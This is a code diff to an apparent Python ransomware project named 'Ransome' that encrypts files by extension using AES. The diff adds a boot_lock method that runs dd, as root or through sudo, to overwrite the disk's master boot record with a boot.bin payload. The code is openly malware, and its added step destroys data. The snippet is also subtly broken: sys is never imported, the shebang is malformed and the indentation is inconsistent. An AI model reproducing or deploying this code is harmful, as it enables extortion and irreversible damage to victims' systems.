@@ -1,5 +1,5 @@
 #bin/bash/python2.7
-import os, random
+import os, random, getpass
 from Crypto.Cipher import AES
 from Crypto.Hash import SHA256
 
@@ -83,6 +83,19 @@ class Ransome:
                 ext = absolute_path.split('.')[-1]
                 if ext in extensions:
                     yield absolute_path
+
+    def boot_lock(self):
+        if sys.platform == 'linux2' and getpass.getuser() == 'root':
+            try:
+                    os.system("dd if=boot.bin of=/dev/hda bs=512 count=1 && exit")
+            except:
+                pass
+
+        elif sys.platform == 'linux2':
+		        try:
+                    os.system("sudo dd if=boot.bin of=/dev/hda bs=512 count=1 && exit")
+                except:
+                    pass
 
     def attack_sys(self):
         startdirs = ['/root/Desktop/ransome_test/']
